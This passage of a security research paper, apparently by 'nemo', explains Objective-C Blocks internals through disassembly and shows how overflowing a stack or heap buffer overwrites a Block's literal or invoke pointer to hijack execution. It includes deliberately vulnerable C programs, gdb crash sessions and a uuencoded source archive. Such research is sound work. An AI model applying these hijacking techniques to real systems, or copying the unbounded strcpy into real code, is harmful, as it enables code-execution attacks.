+    frame #0: 0x00007fff96c210d7 libobjc.A.dylib`objc_msgSend + 23
+libobjc.A.dylib`objc_msgSend + 23:
+-> 0x7fff96c210d7:  andq   (%rdi), %r11
+   0x7fff96c210da:  movq   %rsi, %r10
+   0x7fff96c210dd:  andl   0x18(%r11), %r10d
+   0x7fff96c210e1:  shlq   $0x4, %r10
+(lldb) reg read rdi
+     rdi = 0x4141414141414100
+
+----[ Additional Tagged Types
+
+The additional types in the table have very unique properties. I will leave
+it as an exercise to the reader to investigate each of these types for
+useful ways they can be used from an exploitation perspective.
+
+--[ Blocks
+
+So, Apple being Apple, decided the tried and tested C standard wasn't good
+enough for their magical super fantastic operating system and went ahead
+and modified it. They did this by adding a new construct called Blocks.
+
+For anyone familiar with the concept of an anonymous function reference in
+Perl, or a lambda function in Python, this is essentially what a Block is.
+You can read about blocks in detail in Apple's guide [4]. TL;DR though, a
+block basically uses the "^" operator to declare a special type of function
+pointer where the body of the function can be defined inline. This is
+mostly a syntactic feature, but has a few runtime uses as well. They can be
+passed to other functions just like a function pointer, and can access
+global data, or data relative to the current executing state they are
+defined in. Syntactically blocks are very similar to ecmascript Closures,
+however internally they function a little differently as you'll see.
+
+--[ Sample Block Code
+
+Ok let's take a look at how Blocks are defined. Apple's guide [4] provides
+the following little example code:
+
+
+        int main(int ac, char **av)
+        {
+                int multiplier = 7;
+
+                int (^myBlock)(int) = ^(int num) {
+
+                    return num * multiplier;
+
+                };
+
+                printf("%d\n", myBlock(3));
+        }
+
+As you can see, this code defines a block called myBlock which takes an
+integer argument "num" and multiplies it with a value "multiplier" taken
+from the stack of the main function where the block was declared.
+
+The myBlock Block is then called passing the value 3. As expected when
+executed the block is entered and returns the multiplication of 7 * 3.
+
+-[dcbz@squee:~/code/blocks]$ gcc block.c -o block
+-[dcbz@squee:~/code/blocks]$ ./block
+21
+
+Note, nothing fancy is needed to compile this, Apple's built in compiler
+supports Blocks out of the box.
+
+At first glance, i expected this feature to be syntactical only. I thought
+the compiler would create a function, and then just add a single call
+instruction in the appropriate places. Or maybe a function pointer if
+reassignment was required. However if we walk through the assembly listing
+for this trivial program we can see that is not even close to the case.
+
+First we have the basic function prologue as expected...
+
+EntryPoint:
+       push       rbp                           ; XREF=0x100000e2f
+       mov        rbp, rsp
+       sub        rsp, 0x50
+
+Next argv/argc are moved into stack variables.
+
+       mov        rax, rsi
+       mov        ecx, edi
+       mov        dword [ss:rbp-0x50+var_76], ecx
+       mov        qword [ss:rbp-0x50+var_64], rax
+
+The value 0x7 is stored in a stack variable to be referenced by the Block.
+This it the "multiplier" variable.
+
+       mov        dword [ss:rbp-0x50+var_12], 0x7
+
+Ok now we come to the meat of the Block implementation. As you will see,
+there's a little bit of code here, much more than expected. Before we
+continue tracing it we need to understand a little bit more about Block
+internals.
+
+The free chapter from the book Advanced Mac OS X Programming: The Big Nerd
+Ranch Guide [5] has a really nice write up on the internals of Blocks which
+makes this next bit really clear.
+
+Basically there are two structures defined for every Block created, the
+block_descriptor and block_literal as well as the function containing the
+actual byte-code implementation of the Block.
+
+The block literal structure is the most important structure for us to
+understand. Majority of the assembly listing we are tracing is used to
+populate this structure appropriately. The definition for the structure is
+shown below:
+
+        struct block_literal_NAME {
+            void *isa;
+            int flags;
+            int reserved;
+            void (*invoke)(void *literal, ...);
+            struct block_descriptor_NAME *descriptor;
+            /* referenced captured variables follow */
+        };
+
+Basically, the use of this structure is to turn our Block into a pseudo
+objective-c object. As you can see the typical 'isa' pointer at offset 0
+contains a pointer to the base class struct for the object.
+
+In the listing below, we can see that the block_literal struct is being
+created at offset rbp-0x50+var_16. The ISA pointer is populated with a
+pointer to the class "NSConcreteStackBlock".
+
+       lea        rax, qword [ss:rbp-0x50+var_16]
+       mov        rcx, qword [ds:imp___got___NSConcreteStackBlock]
+       lea        rcx, qword [ds:rcx]
+       mov        qword [ss:rbp-0x50+var_16], rcx
+
+As described in [5], this class indicates that the Block is to be stored on
+the stack. Other possible alternative base classes are:
+NSConcreteGlobalBlock for global Blocks, NSConcreteMallocBlock for heap
+based Blocks, NSConcreteAutoBlock for Blocks affected by garbage collection
+and NSConcreteFinalizingBlock for blocks which have a
+"finalizer"/destructor which must be run apon garbage collection. Cross
+referencing these class structs can give us a pretty good indication where
+Blocks are used in a binary, and also their location in memory at runtime.
+
+       mov        dword [ss:rbp-0x50+var_24], 0x40000000
+
+The next element populated is the flags. I won't go into this too much
+because the write-up at [5] covers it perfectly. The flags enum stores some
+meta information about the Block including garbage collection settings and
+whether or not the Block is global.
+
+Next the reserved field is set to 0.
+
+       mov        dword [ss:rbp-0x50+var_28], 0x0
+
+The main_block_invoke_1 function is the invoke() method for this Block. It
+basically contains the compiled instructions for the block itself. As you
+will see it is called later when the Block is executed.
+
+       lea        rcx, qword [ds:___main_block_invoke_1]
+       mov        qword [ss:rbp-0x50+var_32], rcx
+
+Earlier we discussed the fact that there are two structures for every
+Block. The second of these, the block descriptor is pre-created at compile
+time and stored in the __data section.
+
+       lea        rcx, qword [ds:___block_descriptor_tmp_1.1]
+       mov        qword [ss:rbp-0x50+var_40], rcx
+
+The struct definition is as follows:
+
+        static const struct block_descriptor_NAME {
+            unsigned long reserved;
+            unsigned long literal_size;
+
+            /* helper functions - present only if needed */
+            void (*copy_helper)(void *dst, void *src);
+            void (*dispose_helper)(void *src);
+        };
+
+Basically the only field we care about most of the time is the
+literal_size, which contains the total size of the block_literal. The other
+function pointers are only used in specific cases.
+
+The rest of the block literal struct contains the arguments to invoke.
+A copy of the "multiplier" variable is copied into this struct.
+
+       mov        ecx, dword [ss:rbp-0x50+var_12]
+       mov        dword [ss:rbp-0x50+var_48], ecx
+
+Now that the literal struct is populated, the code has to invoke the Block
+passing in the arguments. This is done by retrieving the invoke function
+pointer from the literal struct populated earlier.
+
+I probably should have used an optimization flag when i compiled this,
+because the next couple of instructions are a little silly. A pointer to
+the block literal struct is moved into var_0, then moved back into rax...
+
+       mov        qword [ss:rbp-0x50+var_0], rax
+       mov        rax, qword [ss:rbp-0x50+var_0]
+
+Next the invoke function pointer is moved into rax by dereferencing this
+pointer and adding 16 (0x10).
+
+       mov        rax, qword [ds:rax+0x10]
+
+The pointer to the block literal struct is then moved into rcx.
+
+       mov        rcx, qword [ss:rbp-0x50+var_0]
+
+The value being passed to the Block in the printf() call (3) is temporarily
+moved to edx.
+
+       mov        edx, 0x3                      ; arg to block
+
+The block_literal struct pointer is moved to rdi, which is the first
+argument in the x86_64 function calling convention (rdi,rsi,rcx,rdx).
+
+       mov        rdi, rcx
+
+The function argument (3) is then moved to esi as the second argument.
+
+       mov        esi, edx
+
+Finally the invoke() method is called. invoke(self,3) basically.
+
+       call       rax
+
+The rest of the assembly listing is just a call to printf to display the
+result, followed by the epilogue.
+
+       mov        ecx, eax
+       xor        dl, dl
+       lea        rdi, qword [ds:0x100000f2c]   ; "%d\\n"
+       mov        esi, ecx
+       mov        al, dl
+       call       imp___stubs__printf
+       mov        eax, dword [ss:rbp-0x50+var_60]
+       add        rsp, 0x50
+       pop        rbp
+       ret
+
+As you can see, this process is fairly straight forward, so now that we
+understand it we can look at how to abuse it.
+
+--[ Exploitation
+
+In order to demonstrate exploitation scenarios where these Blocks can be
+utilized i will start by modifying the example code to contain a trivial
+stack overflow.
+
+int main(int ac, char **av)
+{
+        int multiplier = 7;
+        int (^myBlock)(int) = ^(int num) {
+
+            return num * multiplier;
+
+        };
+        char buf[20];
+        if(ac != 2) {
+                printf("error: need 2nd arg\n");
+                exit(1);
+        }
+
+        strcpy(buf,av[1]);
+        printf("%s: %d\n", buf, myBlock(3));
+        exit(1);
+}
+
+As you can see, prior to the final printf() a call which copies the first
+argument to the program into a small stack buffer, without bounds checking,
+is added. I also added an exit(1); call to demonstrate that this program
+couldn't necessarily be exploited without utilizing the Block. This also
+applies to cases where stack cookies (-fstack-protection) are used.
+
+As we saw in the previous example, the block_literal structure used will be
+stored on the stack. Also the myBlock pointer to this structure is stored
+on the stack in this case.
+
+So what happens when we overflow the buf array in this case? Let's run it
+and see.
+
+-[dcbz@squee:~/code/blocks]$ gcc blockof.c -o of
+-[dcbz@squee:~/code/blocks]$ ./of
+error: need 2nd arg
+-[dcbz@squee:~/code/blocks]$ ./of hello
+hello: 21
+-[dcbz@squee:~/code/blocks]$ gdb ./of
+(gdb) r `perl -e'print "A"x5000'`
+Starting program: /Users/dcbz/code/blocks/of `perl -e'print "A"x5000'`
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: 13 at address: 0x0000000000000000
+0x0000000100000e4e in main ()
+
+As you can see, running this program with a overly large argument overflows
+the stack based buffer and we get an EXC_BAD_ACCESS exception. For some
+reason gdb claims that it happened at address 0x0. However if we do some
+investigation:
+
+(gdb) x/i $pc
+0x100000e4e <main+158>: mov    rax,QWORD PTR [rax+0x10]
+(gdb) i r rax
+rax            0x4141414141414141        4702111234474983745
+
+We can see that the program is crashing dereferencing the block_literal
+struct pointer to retrieve the "invoke" pointer. (based on our previous
+understanding of the assembly listing.) This means we have overwritten the
+pointer to the block_literal struct with a series of 'A's (0x41). Because
+the pointer to the struct lies in front of the struct itself we are unable
+to modify the invoke pointer directly. Therefore we are left with a very
+similar construct to a C++ vptr dereference. We can exploit this in a very
+similar fashion.
+
+The construct is essentially "call [ptr+0x10]", therefore we need to
+control memory at a known address in order to place a pointer to our
+shellcode, then we can use the address of this pointer minus 16 when we
+overwrite the block_literal struct pointer. This will result in execution
+flow being redirected to our shellcode. Another solution would be to
+replace the value of the invoke pointer with another block's invoke method
+or known function. Then utilize an argument mismatch in a favorable way.
+Both of these things have been documented numerous times so i'm not going
+to go into any more detail on this here. Although i will say, in order to
+control memory at a fixed location, a few techniques might be, to use the
+shared_region_map_file technique, or disable aslr/nx with posix_spawn for
+local issues, or use ROP/heapspray for remote issues.
+
+Now that we've looked at the stack overflow case, let's look at what
+happens when the block_literal struct contents are on the heap.
+
+To test this basically we can take the test stack overflow we looked at
+earlier, and this time move the destination of the strcpy() call to the
+heap.
+
+In order to move the Block to the heap we have to utilize a function in the
+runtime architecture. Basically libSystem is linked to the block library:
+/usr/lib/system/libsystem_blocks.dylib. This library contains functions for
+manipulating and displaying Block information. One of the exported
+functions, "Block_copy" is used to create a copy of the block on the heap
+and return a pointer to it. This is typically used by functions that need
+to return a Block, since returning a pointer to a Block on the functions
+stack would be fail when the stack unwinds. The heap Block is then
+free()'ed via the Block_release function. To call these functions we need
+to include the header file "Block.h".
+
+The Block_copy function checks what type of block is being passed to it. If
+the Block was allocated on the heap or .bss it simply returns the Block
+rather than making a copy. Otherwise a copy is placed on the heap and a
+pointer returned, as you can see in the example code below:
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <Block.h>
+
+int main(int ac, char **av)
+{
+        char *buf = malloc(20);
+        int multiplier = 7;
+        int (^stackBlock)(int) = ^(int num) {
+
+            return num * multiplier;
+
+        };
+        int (^myBlock)(int) = Block_copy(stackBlock);
+        if(ac != 2) {
+                printf("error: need 2nd arg\n");
+                exit(1);
+        }
+
+        strcpy(buf,av[1]);
+        printf("%s: %d\n", buf, myBlock(3));
+        exit(1);
+}
+
+Now that we have some sample code, let's compile and run it and see where
+overflowing it gets us.
+
+-[dcbz@squee:~/code/blocks]$ gcc bh.c -o bh
+-[dcbz@squee:~/code/blocks]$ gdb ./bh
+(gdb) r hi
+Starting program: /Users/dcbz/code/blocks/bh hi
+Reading symbols for shared libraries +............................. done
+hi: 21
+
+As expected running it with the string hi, prints the usual output, this
+time executing via the heap allocated Block. However if we pass a string of
+500 'A's...
+
+Program exited with code 01.
+(gdb) r `perl -e'print "A"x500'`
+Starting program: /Users/dcbz/code/blocks/bh `perl -e'print "A"x500'`
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: 13 at address: 0x0000000000000000
+0x0000000100000dc4 in main ()
+(gdb) x/i $pc
+0x100000dc4 <main+276>: call   rax
+(gdb) i r rax
+rax            0x4141414141414141       4702111234474983745
+
+As you can see we get a crash again, however this time rather than it
+dereferencing the block_literal pointer, we have overwritten the invoke()
+method pointer itself and have directly controlled eip.
+
+As you can imagine both these cases are useful when trying to gain control
+of an overflow, especially in the case of stack or heap canaries, or an
+unreachable return.
+
+--[ Future Research -- Non Pointer ISA
+
+Unfortunately, due to the fact that i'm trying to coordinate this paper
+release with my Infiltrate 2015 talk i am probably not going to have time
+to fully research this area prior to publication.
+
+Basically in the Objective-C runtime on the arm64 the ISA pointer can
+function as a tagged pointer as well. Due to the nature of the address
+space there are a significant number of unused bits in the pointer which
+contain an interesting amount of meta-data. The write-up at [6] clearly
+explains all this. I will leave the bit pattern below just in case you are
+interested. I am particularly eager to investigate the has_cxx_dtor
+attribute, as well as the sidetable reference counting information.
+
+(LSB)
+1       bit     indexed
+
+        0 is raw isa, 1 is non-pointer isa.
+
+1       bit     has_assoc
+
+        Object has or once had an associated reference. Object with no
+        associated references can deallocate faster.
+
+1       bit     has_cxx_dtor
+
+        Object has a C++ or ARC destructor. Objects with no destructor can
+        deallocate faster.
+
+30      bits    shiftcls
+
+        Class pointer's non-zero bits.
+
+9       bits    magic
+
+        Equals 0xd2. Used by the debugger to distinguish real objects from
+        uninitialized junk.
+
+1       bit     weakly_referenced
+
+        Object is or once was pointed to by an ARC weak variable. Objects
+        not weakly referenced can deallocate faster.
+
+1       bit     deallocating
+
+        Object is currently deallocating.
+
+1       bit     has_sidetable_rc
+
+        Object's retain count is too large to store inline.
+
+19      bits    extra_rc
+
+        Object's retain count above 1. (For example, if extra_rc is 5 then
+        the object's real retain count is 6.)
+(MSB)
+
+--[ Conclusion
+
+Well you made it to the end reader. Hopefully this was useful in some way!
+Writing is very painful...
+
+Thanks for reading!
+
+- nemo
+
+--[ References
+
+[1] The Objective-C Runtime: Understanding and Abusing -
+        http://phrack.org/issues/66/4.html
+[2] Abusing Performance Optimization Weaknesses to Bypass ASLR -
+        http://www.cc.gatech.edu/~blee303/paper/BH_ASLR_slides.pdf
+[3] - Lets build tagged pointers:
+        https://www.mikeash.com/pyblog/ \
+        friday-qa-2012-07-27-lets-build-tagged-pointers.html
+[4] Apple Block Conceptual -
+        http://developer.apple.com/library/ios/#documentation/cocoa/ \
+        Conceptual/Blocks/Articles/bxOverview.html#//apple_ref/doc/uid/ \
+        TP40007502-CH3-SW1
+[5] Big Nerd Ranch Advanced Mac OS X Programming: Block -
+        http://www.informit.com/articles/article.aspx?p=1749598&seqNum=12
+[6] Non-pointer ISA
+        http://www.sealiesoftware.com/blog/archive/2013/09/24/ \
+        objc_explain_Non-pointer_isa.html
+
+--[ Appendix - Source Code
+
+begin 644 code.tgz
+M'XL(`)7]'U4``^U:6W/3.!3F-?X5(CL%.VU:WYTV9:<EE%D&*`^!W9D-F1W7
+MD1-O?<G83@D+_/<]DFS'N37IT+@PZ.LTL24=7<]WSI&4&/O83O#1HQU"EF7+
+M,!#]-MFWK.KL.P-25$.V+,LT%0/)BFHJUB-D[+)3.29):L?0E1`'T6WEH)CK
+MWI*?C:/X_DD09^L/G]<!/ASMH@V8#U/7UZ^_HJKY^JN:I<#ZZZJB/T+R+CJS
+MB%]\_7_S@G$4I^CT930)!W;J1>'1[/%P]+L@G'EABF/7=C!B6H).T&7WW=6_
+MV$F%)A)O(F\@^=&P+9SA<"`\](@X[H(%_@>[:&,S_XV"_[IF4?ZK%N=_%<CY
+M7\\=0)T0/AC[.,!A2HU`QGJAR9B.@.K"%P$!QC&8!E>L^Y'_,:Q+;>$;-P$_
+M&7+^![87[H;]&_FOFJ96BO]4X+]FJ0;G?Q58P?\M0H+?!MCU0HPZYYT_+KJO
+M_KY`-7FJR1>Z+LO"T1&2I\>RJ[DM$Y^0FL-A2NK-A)Z?=R^Z%V^(R#&9*R@E
+M"$*2QA,G18[MC#!8GO@S^B+4_"@<H@3[[>QQ;`_R1^R-P=ZT!6A.GBJ.N(>=
+MJ710U./:UYC6A9BI<D9V3,1[\E25^VV:1NNAA?X9IS&K#0P:(EP0R8,=#YT#
+MY$1ADK(*&B3IIM>7A+QSC:N)<XW3!#T#,=^/'%&<3<H^4B202;S_<.12ZXD:
+M$IC)VO)@&Q!=%57,:BB$ER1(/2C#TIA=9Y9).QY.@IY!QEV;A(DW#/$`D0%Z
+M,.*:YXJ/\U%\_8H>.U@B<U_+K7OO<1_1?C%OX-J>CP>'S.#7:GCJI:)"'K\)
+M19N7W6X*TC`]/HRJURO>:3U]:-M+__+2T8?W+ULLYZ0^PI"'/D6Q/ZCW2;^*
+M]O?[J(O3E,A/QBCK:M9^]M:3^]`0Z*#KNHXLMQ$H86`GUT+-C6+1HWD*:B,/
+MG9:4%M[WGRELM'E%'JE()&LK/7%PSVLJ9-9JV>,A*"/DYRK\%8G>Z:DJE4N`
+M8M+F!M@>7&'LMA%D'C7@H]CLHM9QIX7F$$0W"-O3`]#B64D5(>,"+6`<C1%.
+MO%DI#4J]6%GJ:CPKI2/4T19+Q3B%$HTCLGBU^1E_$868S7&QJN7LCF\G"3J#
+M<>[Y4RAW(!:*1>?.+ZMG)@A*>%#?\[U;"S-6`1_S90#*V&GD$^E2L0`'"4[%
+M)ZYS\/3CU'&>'F1$<1W*,-<Y+)A=+&BVQE0[\N?Y4;^[P?&GV*.Z%M$=3J9G
+MY1Y)T"JMPTML!.E%IQ:4M@/:3BH*<#J*!K2BVM)D9L1@1O*$S">=SIZ?)?5)
+MZ[!.DSA$,HFP[C>Z*OM_4W^0^%^33:OP_[IJDOA?D17N_ZO`]_G_RP]OGW_H
+MO+YXWT7$K\K4^\M3"ZSP\;';:NFZ=4L`P`JVJ'72K2+[[7GW-8+,%IO*=2Z]
+MY-&5S*-3<\&(31UZGD0\`7/O6T49<1Y:W"$86.'1ER.#V73MEP.#G?GV^83$
+M]P9XP>'_/)Z>>7(Z!N)>VVPXX,Y+.I@E[N_/NW2:N.BZ]U%668.$!J!G=(P+
+M(C'UY2OJ:2++,`U=U\UVY;[SKB[S+CZ3,`5J(11LUXH8JMSYYYE6K^]^KEH+
+MKK4[\MP4REQM6P%,\D*&N/!.NGEZJDMT,==Q"1:X1+RF(N5C+0P%F;9J>_"C
+M1AUBV6!(5<4@'`^'//Y["_[%!7._BS8VG?^JRNS\E]W_Z:K!X[]*`,;B1*@-
+M'0<U`TU%33>V`PRN^1K-0CZ47PX@=DJ(FA%-RN0VBY"-12YDZH+@P$,(S<8!
+M32K2'WHR?D'D_$_MX1`/=O,S`'G[^W]5`T,!_)=U@]__5X&%]=^)&]AD_W6K
+ML/^*9FBP_H:AJ-S^5X&2_5]IQ\,$=A(!,]_L^?;2"0TLE5P@>]U&1IV746^7
+M@:W-%8Z+=K+7;634>1FU[(W8"&?]GO5FUD9)\J$7[QZPP/]\N>^UC4W\UY3\
+M_@_VU/3\SS#X_5\UV'S85Y3H1#%^8:?V4?Y`CP+O<$96WJ5>=L\)T]BF$@].
+MT-YD;@,J]41O("DKSX_\R*_WZ9$0WY-^+Y;X7QC6^VMCH__7BO-_Q;)(_&<J
+M.O_]3R6HDO^7W4NJ7*@1DK/BXI6I'&'YJS#%0QR?S&Y/78P'Y*>'?7*-RJK,
+MSL38B_0DG)V3R5/7(F;ALOLF&HIG]74'C+T0Y0EOX)W\_VG[$_P+GG.MX;_Z
+M8/PW9<9_C?._"ORH_`>M4,I_6_)?ECG_[X0E_A<;N/MK8Q/_35TIXG_=5"C_
+M#9/SOPI4R__\KCC9^JXX'7F)E]@W./Y,J,NT,XQ2IJ_D^GBU54CFH@*#7IP5
+M[;VGPFCU[6Q1:OT%95*Z?)V[XERZ55MM?I+RO5INK/;.Z@=)Y;N:-?ROU/^;
+MQ?FO82FFQ?E?(7YT_I\S;$GT[)>?D[`)^LSIS<'!P<'!P<'!P<'!P<'!P<'!
+/P<'!\<OB?]V9SVT`4```
+`
+end
